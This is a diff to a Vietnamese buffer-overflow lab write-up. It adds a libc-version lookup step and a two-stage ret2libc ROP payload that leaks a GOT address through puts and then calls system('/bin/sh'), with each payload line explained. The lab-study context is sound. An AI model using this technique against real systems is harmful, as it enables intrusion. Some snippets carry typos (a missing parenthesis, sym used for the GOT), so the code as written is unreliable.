@@ -244,4 +244,18 @@ sudo docker stop bof7_container && sudo docker rm bof7_container
 
 <img width="1392" height="573" alt="Screenshot 2026-10-05 181623" src="https://github.com/user-attachments/assets/5f29b49e-351d-4b94-a982-009d858c37f8" />
 
--Do offset mỗi hàm thay đổi theo phiên bản libc, đồng thời có thể libc trên máy mình đang dùng sẽ khác với libc của server mình kết nối đến. Mình truy cập libc.rip, paste địa chỉ vào và tìm phiên bản libc phù hợp, vì có rất nhiều phiên bản khớp với 3 byte cuối của địa chỉ nên mình bắt buộc phải thử từng phiên bản libc một.
+-Do offset mỗi hàm thay đổi theo phiên bản libc, đồng thời có thể libc trên máy mình đang dùng sẽ khác với libc của server mình kết nối đến. Mình truy cập libc.rip, paste địa chỉ vào và tìm phiên bản libc phù hợp, vì có rất nhiều phiên bản khớp với 3 byte cuối của địa chỉ nên mình bắt buộc phải thử từng phiên bản libc một.   
+
+<img width="1055" height="767" alt="Screenshot 2026-10-08 132302" src="https://github.com/user-attachments/assets/84a8b97c-45e9-49e3-9247-6f50fc96b6a1" />
+### Script
+Stage 1   
+`payload=b'A'*88` lấp đầy đến vị trí Return address   
+`payload += p64(pop_rdi) + p64(exe.sym[puts]` đặt địa chỉ của gadget pop rdi vào và cung cấp giá trị tham số là địa chỉ GOT của hàm puts() cho rdi   
+`payload += p64(exe.plt['puts']` ngay sau lệnh pop rdi, gadget thực hiện ret và nhảy đến puts@plt. Hàm puts() sẽ nhận giá trị trong rdi (địa chỉ GOT) làm tham số và in nội dung địa chỉ đó   
+`payload += p64(exe.sym['main'])` Khi hàm puts() hoàn thành và ret, nó sẽ nhảy về địa chỉ của hàm main() để chạy lại chương trình  
+Stage 2   
+`payload += b'A'*88` ghi đè lại buffer đến saved-rbp  
+`payload += p64(pop_rdi) + p64( next(libc.search(b'/bin/sh')))` đưa địa chỉ gadget pop rdi vào retrun address và lấy địa chỉ chuỗi /bin/sh nạp vào rdi   
+`payload += p64(libc.sym['system'])` lệnh ret nhảy thẳng vào hàm system trong libc, rdi đã chứa chuỗi /bin/sh nên có thể thực thi được `system("/bin/sh")`   
+
+## BOF8 - Stack Pivot   
